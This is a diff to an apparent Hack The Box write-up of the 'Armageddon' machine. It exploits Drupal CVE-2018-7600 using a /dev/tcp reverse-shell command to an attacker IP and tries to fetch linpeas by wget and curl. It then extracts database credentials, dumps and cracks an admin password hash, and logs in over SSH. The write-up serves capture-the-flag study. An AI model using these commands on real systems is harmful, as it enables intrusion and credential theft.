@@ -111,8 +111,158 @@ Next, we would need to find the version of Drupal that is being used. Looking at
 
 ![Drupal version](https://github.com/joelczk/writeups/blob/main/HTB/Images/Armagaddon/drupal_version.PNG)
 
-Reseaching on Drupal online, we realized that Drupal 7.56 may be vulnerable to CVE-2018-7600, which is a remote code execution vulnerability. For this CVE, we are able to find an exploit code on github [here](https://github.com/dreadlocked/Drupalgeddon2). Th 
+Reseaching on Drupal online, we realized that Drupal 7.56 may be vulnerable to CVE-2018-7600, which is a remote code execution vulnerability. For this CVE, we are able to find an exploit code on github [here](https://github.com/pimps/CVE-2018-7600
 * Tried to use burp suite to exploit it but failed to exploit
-* Tried to use the repository [here](https://github.com/pimps/CVE-2018-7600) as well but failed too! (Maybe I used the wrong payload)
+* Noticed that this exploit fails on other port numbers, but succeeds on 80 and 443 (Probably there is some network filtering that only allows HTTP/HTTPS packets)
 
-![Web Shell](https://github.com/joelczk/writeups/blob/main/HTB/Images/Armagaddon/web_shell.PNG)
+```
+┌──(htb)─(kali㉿kali)-[~/Desktop/cve/CVE-2018-7600]
+└─$ python3 drupa7-CVE-2018-7600.py http://armageddon.htb/ -c "/bin/bash -l > /dev/tcp/10.10.16.5/80 0<&1 2>&1" 
+
+=============================================================================
+|          DRUPAL 7 <= 7.57 REMOTE CODE EXECUTION (CVE-2018-7600)           |
+|                              by pimps                                     |
+=============================================================================
+
+[*] Poisoning a form and including it in cache.
+[*] Poisoned form ID: form-Fj590FyjhiAdl0tTQ2AzhhFiz1ZL8pco6ubljoNInT0
+[*] Triggering exploit to execute: /bin/bash -l > /dev/tcp/10.10.16.5/80 0<&1 2>&1
+```
+
+## Obtaining user flag
+
+Next, we would have to stabilize our shell. However, we are faced with a ```OSError: out of pty devices``` when we try to stabilize the shell. We would use an alternative method ```/bin/bash -i``` to obtain our shell.
+
+```
+┌──(kali㉿kali)-[~]
+└─$ nc -nlvp 80                 
+listening on [any] 80 ...
+connect to [10.10.16.5] from (UNKNOWN) [10.10.10.233] 46888
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+Traceback (most recent call last):
+  File "<string>", line 1, in <module>
+  File "/usr/lib64/python3.6/pty.py", line 154, in spawn
+    pid, master_fd = fork()
+  File "/usr/lib64/python3.6/pty.py", line 96, in fork
+    master_fd, slave_fd = openpty()
+  File "/usr/lib64/python3.6/pty.py", line 29, in openpty
+    master_fd, slave_name = _open_terminal()
+  File "/usr/lib64/python3.6/pty.py", line 59, in _open_terminal
+    raise OSError('out of pty devices')
+OSError: out of pty devices
+/bin/bash -i
+bash: no job control in this shell
+bash-4.2$ export TERM=xterm
+export TERM=xterm
+bash-4.2$ stty cols 132 rows 34
+stty cols 132 rows 34
+stty: standard input: Inappropriate ioctl for device
+bash-4.2$
+```
+
+However, we realize that we do not have the permissions to view the user flag
+
+```
+ls -la home
+ls: cannot open directory home: Permission denied
+bash-4.2$ 
+```
+``
+We also realize that we are unable to execute linepeas script here to discover privilege escalation vectors as we do not ```wget``` and ```curl``` failed to connect to our local machine
+
+```
+wget http://10.10.16.5:4000/linpeas.sh
+bash: wget: command not found
+bash-4.2$ curl -o linpeas.sh http://10.10.16.5:4000/linpeas.sh
+curl -o linpeas.sh http://10.10.16.5:4000/linpeas.sh
+curl: (7) Failed to connect to 10.10.16.5: Permission denied
+```
+
+However, what we noticed is that the terminal has a mysql database. So, now we will search for the database credentials to login to the database. From the forum [here](https://www.drupal.org/forum/support/post-installation/2017-01-13/where-are-the-database-username-and-password-stored), we know that the database credentials are stored in /sites/default/settings.php. We will then navigate to the file to find the database credentials.
+
+```
+bash-4.2$ cd sites
+cd sites
+bash-4.2$ ls
+ls
+README.txt
+all
+default
+example.sites.php
+bash-4.2$ cd default
+cd default
+bash-4.2$ ls
+ls
+default.settings.php
+files
+settings.php
+bash-4.2$ cat settings.php
+cat settings.php
+```
+
+From the PHP file, we are able to find the database credentials
+
+```
+$databases = array (
+  'default' => 
+  array (
+    'default' => 
+    array (
+      'database' => 'drupal',
+      'username' => 'drupaluser',
+      'password' => 'CQHEy@9M*m23gBVj',
+      'host' => 'localhost',
+      'port' => '',
+      'driver' => 'mysql',
+      'prefix' => '',
+    ),
+  ),
+);
+```
+
+Using these credentials, we are able to login to the mysql database and find a user called ```brucetherealadmin```, with the corresponding password hash ```$S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt```
+
+```
+bash-4.2$ mysql -u drupaluser -p -h localhost -D drupal
+mysql -u drupaluser -p -h localhost -D drupal
+Enter password: CQHEy@9M*m23gBVj
+use drupal
+select * from users;
+exit
+uid     name    pass    mail    theme   signature       signature_format        created access  login   status  timezone        language        picture init    data
+0                                               NULL    0       0       0       0       NULL            0               NULL
+1       brucetherealadmin       $S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt admin@armageddon.eu                     filtered_html   1606998756      1607077194      1607076276      1       Europe/London               0       admin@armageddon.eu     a:1:{s:7:"overlay";i:1;}
+bash-4.2$ 
+```
+
+Now, we have to identify the type of hash so that we can specify the hash type when cracking using hashcat
+
+```
+┌──(kali㉿kali)-[~/Desktop]
+└─$ hashid -m '$S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt'
+Analyzing '$S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt'
+[+] Drupal > v7.x [Hashcat Mode: 7900]
+```
+
+Next, we will use hashcat to crack the hash. The hash turns out to be ```booboo```
+
+```
+┌──(kali㉿kali)-[~/Desktop]
+└─$ cat ~/.hashcat/hashcat.potfile
+$S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt:booboo
+```
+Now, all we have to do is to SSH as ```brucetherealadmin``` and we can obtain the flag
+
+```
+┌──(kali㉿kali)-[~/Desktop]
+└─$ ssh brucetherealadmin@10.10.10.233
+The authenticity of host '10.10.10.233 (10.10.10.233)' can't be established.
+ECDSA key fingerprint is SHA256:bC1R/FE5sI72ndY92lFyZQt4g1VJoSNKOeAkuuRr4Ao.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.10.233' (ECDSA) to the list of known hosts.
+brucetherealadmin@10.10.10.233's password: 
+Last login: Fri Mar 19 08:01:19 2021 from 10.10.14.5
+[brucetherealadmin@armageddon ~]$ cat user.txt
+<Redacted user flag>
+[brucetherealadmin@armageddon ~]$ 
+```
